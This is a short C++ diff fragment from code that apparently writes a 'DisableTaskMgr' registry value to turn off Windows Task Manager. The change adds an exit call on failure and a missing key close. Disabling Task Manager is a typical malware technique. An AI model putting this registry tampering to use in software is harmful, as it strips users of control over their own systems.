@@ -22,6 +22,7 @@ public:
 
 			if (RegSetValueEx(hKey, DisableTaskMgr, 0, REG_DWORD, (const BYTE*)&val_disable, sizeof(val_disable)) != ERROR_SUCCESS)
 			{
+				exit(0);
 				return;
 			}
 			else
@@ -35,6 +36,7 @@ public:
 			RegCloseKey(hKey);
 			return;
 		}
+		RegCloseKey(hKey);
 	}
 	void ModifyRegistry()
 	{
